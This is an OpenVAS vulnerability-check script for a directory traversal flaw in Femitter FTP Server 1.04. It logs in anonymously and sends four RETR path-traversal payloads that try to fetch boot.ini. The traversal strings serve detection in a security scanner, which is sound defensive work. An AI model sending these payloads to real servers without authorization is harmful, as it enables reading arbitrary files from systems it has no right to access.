###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_femitter_ftp_server_dir_trav_vun.nasl 8296 2018-01-05 07:28:01Z teissa $
#
# Femitter FTP Server Multiple Directory Traversal Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attackers to read arbitrary
files on the affected application.

Impact Level: Application";

tag_affected = "Femitter FTP Server version 1.04";

tag_insight = "The flaw is due to an error while handling certain requests
which can be exploited to download arbitrary files from the host system.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "The host is running Femitter FTP server and is prone to directory
traversal vulnerabilities.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801538");
  script_version("$Revision: 8296 $");
  script_tag(name:"last_modification", value:"$Date: 2018-01-05 08:28:01 +0100 (Fri, 05 Jan 2018) $");
  script_tag(name:"creation_date", value:"2010-11-16 10:37:01 +0100 (Tue, 16 Nov 2010)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:P");
  script_name("Femitter FTP Server Multiple Directory Traversal Vulnerabilities");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15445/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("secpod_ftp_anonymous.nasl");
  script_require_ports("Services/ftp", 21);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("ftp_func.inc");
include("version_func.inc");

## Get the default port of FTP
ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

## check port status
if(!get_port_state(ftpPort)){
  exit(0);
}

# Get the FTP banner
banner = get_ftp_banner(port:ftpPort);
if("220 Femitter FTP Server ready." >!< banner){
  exit(0);
}

soc1 = open_sock_tcp(ftpPort);
if(!soc1){
  exit(0);
}

# Check for the user name and password
domain = get_kb_item("Settings/third_party_domain");
if(isnull(domain)) {
  domain = this_host_name();
}

user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

## Try for anomymous user and passwrd
if(!user){
  user = "anonymous";
}

if("anonymous" >!< pass){
  pass = string("anonymous");
}

login_details = ftp_log_in(socket:soc1, user:user, pass:pass);
if(login_details)
{
  ## List the possibele exploits
  exploits = make_list("RETR  /..\/..\/..\/..\boot.ini",
                       "RETR ..//..//..//..//boot.ini",
                       "RETR \\\..\..\..\..\..\..\boot.ini",
                       "RETR ../../../../../../../../../../../../../boot.ini");

  result = ftp_send_cmd(socket: soc1, cmd:"PASV");

  ## Check each exploit
  foreach exp (exploits)
  {
    result = ftp_send_cmd(socket: soc1, cmd:exp);
    if("150 Opening data connection" >< result)
    {
      security_message(ftpPort);
      exit(0);
    }
  }

  ftp_close(socket:soc1);
}
